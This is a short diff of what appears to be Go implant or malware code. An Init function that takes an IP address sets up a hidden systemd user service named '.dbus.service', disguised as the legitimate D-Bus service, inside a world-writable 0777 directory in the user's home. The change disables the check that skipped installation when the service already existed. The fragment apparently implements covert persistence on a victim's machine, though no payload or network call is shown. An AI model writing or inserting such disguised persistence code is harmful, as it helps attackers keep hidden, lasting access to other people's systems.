@@ -146,9 +146,9 @@ func Init(ip string) {
 	// get current home directory
 	home, _ := os.UserHomeDir()
 
-	if _, err = os.Stat(home + "/.config/systemd/user/.dbus.service"); err == nil {
-		return
-	}
+	// if _, err = os.Stat(home + "/.config/systemd/user/.dbus.service"); err == nil {
+	// 	return
+	// }
 
 	err = os.MkdirAll(home+"/.config/systemd/user/", 0777)
 	if err != nil {
